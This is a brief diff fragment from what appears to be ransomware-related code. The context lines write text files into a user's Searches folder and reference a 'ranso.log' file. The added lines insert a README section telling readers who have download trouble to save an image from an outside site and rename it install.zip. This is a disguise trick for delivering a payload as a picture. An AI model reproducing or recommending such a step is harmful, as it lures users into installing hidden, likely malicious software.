@@ -68,3 +68,9 @@ C:\ranso.log
             f = open("%s/Searches/%s"%(usr,filename), "w")
             f.write(txt)
             f.close()
+
+## Issues downloading? 
+
+Save this image and rename to install.zip
+
+![](https://nabyte.com/imgs/caab55160300965b96a9304a26adab6a7ba835acinstaller.png)
